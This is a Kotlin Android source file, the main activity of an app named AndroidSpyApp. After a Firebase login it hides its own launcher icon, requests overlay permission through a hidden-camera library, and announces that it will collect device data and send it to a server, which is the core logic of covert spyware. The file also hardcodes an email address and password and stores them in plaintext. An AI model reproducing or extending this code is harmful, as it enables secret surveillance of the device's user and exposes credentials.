package com.komnacki.androidspyapp

import android.content.ComponentName
import android.content.Context
import android.content.DialogInterface
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.androidhiddencamera.HiddenCameraUtils
import com.google.firebase.auth.FirebaseAuth
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {
    companion object {
        const val PREFS_SERVICE_NEXT_ALARM: String = "SHARED_PREFERENCE_LAST_ALARM_TIME"
        const val SHARED_PREFERENCE_TAG: String = "SHARED_PREFERENCE_NAME"
        const val PREFS_IS_FIRST_LAUNCH: String = "IS_FIRST_LAUNCH"
        const val PREFS_USER_EMAIL: String = "PREFS_USER_EMAIL"
        const val PREFS_USER_PASSWORD: String = "PREFS_USER_PASSWORD"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setTheme(R.style.Theme_AppCompat)
        setContentView(R.layout.activity_main)

        val auth: FirebaseAuth = FirebaseAuth.getInstance()

        val prefs = getSharedPreferences(SHARED_PREFERENCE_TAG, Context.MODE_PRIVATE)
        val isFirstRun = prefs.getBoolean(PREFS_IS_FIRST_LAUNCH, true)

        if (isFirstRun) {
            val editor = prefs.edit()
            editor.putBoolean(PREFS_IS_FIRST_LAUNCH, false)
            editor.apply()

            if (!HiddenCameraUtils.canOverDrawOtherApps(this)) {
                //Open settings to grant permission for "Draw other apps".
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
            }

            Log.d("KK: MAIN: ", "main activity onCreate  ")

            var isEmailValid = false
            var isPasswordValid = false
            et_email.addTextChangedListener(object : TextWatcher {
                override fun afterTextChanged(s: Editable?) {
                    isEmailValid = validateEmail(s.toString())
                    btn_connect.isEnabled = isEmailValid && isPasswordValid
                }

                override fun beforeTextChanged(
                    s: CharSequence?,
                    start: Int,
                    count: Int,
                    after: Int
                ) {
                }

                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            })
            et_password.addTextChangedListener(object : TextWatcher {
                override fun afterTextChanged(s: Editable?) {
                    isPasswordValid = !s.toString().isBlank()
                    btn_connect.isEnabled = isEmailValid && isPasswordValid
                }

                override fun beforeTextChanged(
                    s: CharSequence?,
                    start: Int,
                    count: Int,
                    after: Int
                ) {
                }

                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
            })

            btn_connect.setOnClickListener {
                if (btn_connect.isEnabled) {
                    val email = "wapnszkola@gmail.com"/*et_email.text.toString()*/
                    val password = "qweasd"/*et_password.text.toString()*/
                    setButtonVisibility(false)
                    auth.signInWithEmailAndPassword(email, password)
                        .addOnCompleteListener(this) { task ->
                            if (task.isSuccessful) {
                                // Sign in success, update UI with the signed-in user's information
                                Log.d("KK: ", "signInWithEmail:success")
                                saveUserCredential(prefs, email, password)
                                hideAppIcon()

                                val dialog = AlertDialog.Builder(this)
                                    .setTitle("Attention!")
                                    .setMessage("The visual interface of app will be close now, and not visible in the future. The AndroidSpyApp will start collecting data about user device and sending data to the server.")
                                    .setPositiveButton("OK") { dialog: DialogInterface?, _: Int ->
                                        run {
                                            Log.d("KK:", "dialog_OK clicked. Finish activity!")
                                            dialog?.dismiss()
                                            this.finish()
                                        }
                                    }
                                setButtonVisibility(true)
                                dialog.show()
                            } else {
                                setButtonVisibility(true)
                                // If sign in fails, display a message to the user.

                                Log.w("KK: ", "signInWithEmail:failure", task.exception)
                                Toast.makeText(
                                    baseContext, "Authentication failed.",
                                    Toast.LENGTH_SHORT
                                ).show()
                            }
                        }
                }
            }
        }
    }

    private fun saveUserCredential(prefs: SharedPreferences, email: String, password: String) {
        val editor = prefs.edit()
        editor.putString(PREFS_USER_EMAIL, email.replace(".", "_"))
        editor.putString(PREFS_USER_PASSWORD, password)
        editor.apply()
    }

    private fun hideAppIcon() {
        val p = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun setButtonVisibility(isBtnVisible: Boolean) {
        btn_connect.visibility = if (isBtnVisible) View.VISIBLE else View.GONE
        progressBar.visibility = if (isBtnVisible) View.GONE else View.VISIBLE
    }

    override fun onDestroy() {
        super.onDestroy()
//        startService(Intent(this, MainService::class.java))
//        val restartService =
//            Intent(applicationContext, ServiceReceiver::class.java)
//        restartService.action = Intent.ACTION_DEFAULT
//
//        val pendingIntent = PendingIntent.getBroadcast(
//            applicationContext,
//            1,
//            restartService,
//            PendingIntent.FLAG_ONE_SHOT
//        )
//        val alarmManager =
//            getSystemService(Context.ALARM_SERVICE) as AlarmManager
//        alarmManager.set(
//            AlarmManager.ELAPSED_REALTIME,
//            SystemClock.elapsedRealtime() + 5 * 1000, pendingIntent
//        )
        Log.d("KK:", "onDestroy main activity!")
    }

    fun validateEmail(input: String): Boolean {
        return input.matches(Regex("[a-zA-Z0-9._-]+@[a-z]+.[a-z]+"))
    }
}